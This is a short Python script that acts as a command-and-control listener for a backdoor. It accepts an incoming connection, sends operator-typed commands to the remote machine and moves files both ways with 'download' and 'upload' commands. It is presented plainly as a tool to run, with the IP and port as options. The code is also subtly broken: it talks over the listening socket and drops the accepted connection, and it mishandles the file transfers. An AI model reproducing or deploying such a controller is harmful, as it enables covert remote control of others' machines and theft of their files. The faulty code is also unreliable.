import socket
import optparse
import simplejson
import base64
class Connecting:
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port
        self.connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connect.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.connect.bind((self.ip, int(self.port)))
        self.connect.listen(0)
        a, b = self.connect.accept()
        print("Connected:" + str(b))

    def start(self):
        while True:
            com = input("Command: ")
            com = com.split(" ")
            self.packaging(com)
            data = self.unpacking()
            try:
                if com[0] == "download":
                    with open(com[1],"wb") as file:
                        file.write(base64.b64decode(self.unpacking()))
                    data = "downloaded: "+com[1]
                elif com[0] == "upload":
                    with open(com[1],"rb") as files:
                        data2 = base64.b64encode((files.read()))
                        com.append(data2)
                print(data)
            except:
                print("Error!!!")
    def packaging(self,data):
        packet = simplejson.dumps(data)
        self.connect.sendall(packet.encode("utf-8"))
        if data[0] == "quit":
            self.connect.close()
            exit()
    def unpacking(self):
        incoming_data = ""
        while True:
            try:
                incoming_data = self.connect.recv(1024).decode("utf-8")
                return simplejson.loads(incoming_data)
            except ValueError:
                continue
def user_input():
    parser = optparse.OptionParser()
    parser.add_option("-p","--port",dest="port",help="Enter port")
    parser.add_option("-i","--ip",dest="inp",help="Enter ip address")
    return parser.parse_args()

con = Connecting(user_input()[0].inp,int(user_input()[0].port))
#con = Connecting("192.168.1.106",888)
con.start()
